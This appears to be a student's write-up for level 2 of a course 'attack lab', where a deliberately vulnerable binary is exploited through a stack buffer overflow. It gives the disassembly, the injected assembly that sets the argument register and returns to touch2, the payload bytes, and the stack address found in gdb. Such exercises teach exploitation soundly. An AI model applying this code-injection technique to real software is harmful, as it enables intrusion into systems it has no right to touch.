```asm
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

1. in order to call `touch2`, we need to `ret` to address `4017ec`
2. in order to pass `if (val == cookie)` check, we need to control the first argument to `touch2`, which is stored at `%edi`
3. if we `ret` to `touch2` directly, like ctarget.l1 does, `%edi` will be an uncertain value, so before we call `touch2`, we should set value for `%edi` (see [solution2.s](./solution2.s)):
   ```asm
    mov $0x59b997fa,%edi  # from ./cookie.txt
    push $0x4017ec        # address of touch2
    retq
   ```

   then use `gcc -c solution2.s`, `objdump -d solution2.s > objdump_solution2.asm` to generate binary value (see [objdump_solution2.asm](./objdump_solution2.asm)):

   ```asm
    solution2.o:     file format elf64-x86-64


    Disassembly of section .text:

    0000000000000000 <.text>:
      0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
      5:	68 ec 17 40 00       	pushq  $0x4017ec
      a:	c3                   	retq   
   ```

   so this is the first few bytes of our input
4. just like ctarget.l1, we need to first `ret` to our self-defined code. Since
   > This program is set up in a way that the stack positions will be consistent from one run to the next

   we use gdb to check the value of `%esp - 0x28` when starting `getbuf`, and the value is `0x5561dc78`, so the last few bytes should be `78 dc 61 55 00 00 00 00`

5. when return to `0x5561dc78`, program will run our defined code, set value for `%edi`, and call `touch2`

6. all other bytes can be random